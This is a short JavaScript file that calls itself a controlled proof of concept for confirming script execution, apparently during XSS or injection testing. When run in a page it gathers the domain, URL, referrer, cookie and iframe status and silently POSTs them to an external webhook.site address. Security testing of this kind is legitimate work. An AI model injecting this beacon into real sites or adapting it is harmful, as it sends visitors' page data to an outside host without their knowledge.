// poc.js — PoC controlado para confirmar ejecución real
(function() {
    const data = {
        domain: document.domain,
        origin: location.origin,
        url: location.href,
        referrer: document.referrer || null,
        cookies_enabled: navigator.cookieEnabled,
        in_iframe: window.self !== window.top,
        timestamp: new Date().toISOString()
    };

    fetch("https://webhook.site/c3444402-12db-4d8a-a694-0bc71f2c1521", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    }).catch(() => {});
})();
